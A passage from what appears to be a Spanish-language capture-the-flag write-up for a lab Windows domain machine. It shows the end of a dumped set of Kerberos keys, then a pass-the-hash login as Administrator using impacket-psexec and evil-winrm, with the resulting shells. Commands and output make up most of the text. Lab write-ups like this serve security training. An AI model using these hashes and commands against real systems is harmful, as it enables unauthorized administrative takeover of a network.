EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:6c763a896f7bbd07083d53c16f15b782807fe6e350f72b3cf052b5f53a7bb2bc
SAUNA$:aes128-cts-hmac-sha1-96:e23caa6a98f63e6f8d986fd1e3cc1634
SAUNA$:des-cbc-md5:2fae54dacda8c1f4
[*] Cleaning up... 
```

- Pass The Hash

```bash
❯ impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 cmd.exe -hashes :823452073d75b9d1cf70ebdf86c7f98e
```

```ruby
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file lRgQGQin.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service vTOL on 10.10.10.175.....
[*] Starting service vTOL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

> También podemos conectarnos con evil-winrm

```bash
❯ evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

```ruby
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```


![](/img2/Pasted%20image%2020250629191415.png)